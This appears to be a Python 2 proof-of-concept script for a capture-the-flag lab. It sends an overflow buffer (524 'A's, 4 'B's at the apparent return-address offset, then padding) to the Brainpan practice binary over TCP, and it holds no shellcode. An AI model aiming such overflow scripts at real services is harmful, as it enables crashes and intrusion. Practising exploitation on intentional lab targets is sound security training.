#!/usr/bin/python

import time, struct, sys
import socket as so

buff = "A" * 524 + "B" * 4 + (900 - 524 - 4) * "C"

try:
    server = str(sys.argv[1])
    port = int(sys.argv[2])
except IndexError:
    print "Usage: python %s brainpan2.py 192.168.56.101 9999" % sys.argv[0]
    sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "Attempting to send buffer overflow to brainpan.exe from" , server , port

try:
    time.sleep(1)
    s.connect((server, port))
    s.send(buff + '\r\n')
    print " \n---COMPLETED---\n"
except:
    print "Unable to connect, check if IP address and PORT is correct"
    sys.exit()
